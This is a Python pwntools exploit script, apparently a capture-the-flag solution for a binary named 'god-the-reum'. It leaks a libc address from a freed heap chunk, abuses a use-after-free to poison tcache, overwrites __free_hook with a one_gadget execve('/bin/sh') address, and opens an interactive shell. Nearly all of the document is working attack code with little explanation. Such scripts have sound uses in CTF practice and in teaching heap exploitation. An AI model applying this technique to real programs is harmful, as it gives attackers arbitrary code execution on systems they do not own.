#!/usr/bin/python
from pwn import *

def Create(eth):
	r.sendlineafter('select your choice : ', '1')
	r.sendlineafter('how much initial eth? : ',str(eth))

def Withdraw(num, eth):
	r.sendlineafter('select your choice : ', '3')
	r.sendlineafter('input wallet no : ', str(num))
	r.sendlineafter('how much you wanna withdraw? : ', str(eth))

def Show(num):
	r.sendlineafter('select your choice : ', '4')
	r.recvuntil(str(num)+') addr : ')
	leak = int(r.recvline().split(' ')[2],10)
	return leak

def Develop(num, eth):
	r.sendlineafter('select your choice : ', '6')
	r.sendlineafter('input wallet no : ', str(num))
	sleep(1)
	r.sendlineafter('new eth : ', eth)

context.log_level = 'debug'
r = process('./god-the-reum', env={'LD_PRELOAD':'./libc-2.27.so'}) 
r = process('./god-the-reum')
libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gdb.attach(r)

'''
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000

0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one = [0x4f2c5, 0x4f322, 0x10a38c]

Create(0x410) # 0x410 + header = 0x420
Create(0x60)
Withdraw(0, 0x410)
leak = Show(0)

# main_arena + 96
libc_base = leak - 96 - libc.symbols['__malloc_hook'] - 0x10
__free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + one[1]
success('leak(main_arena+88) = '+hex(leak))
log.info('libc_base = '+hex(libc_base))
log.info('__free_hook = '+hex(__free_hook))
log.info('one_gadget = '+hex(one_gadget))


Withdraw(1, 0x60)
Develop(1, p64(__free_hook))

Create(0x60)
Create(0x60)
Develop(3, p64(one_gadget))

Withdraw(2, 0x60)

r.interactive()